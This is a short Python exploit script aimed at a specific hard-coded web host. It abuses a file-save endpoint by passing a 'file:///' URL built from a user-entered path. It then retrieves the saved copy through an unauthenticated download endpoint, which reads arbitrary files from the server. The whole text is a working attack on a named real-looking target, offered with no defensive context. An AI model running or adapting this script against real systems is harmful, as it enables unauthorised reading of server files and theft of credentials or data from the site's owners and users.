import requests
dump_name = '康源'
target = 'http://s.qckyyy.com:81'
path = input('path: ')
payload1 = requests.get(
    target+'/wxjsapi/saveYZJFile?fileName=test&fileExt=txt',
    params={'downloadUrl': 'file:///'+path})
rid = payload1.json()['id']
print(rid)
print()
payload2 = requests.get(target+'/file/fileNoLogin/'+rid,)
payload2.encoding = 'gbk'
res = payload2.text
print(res)
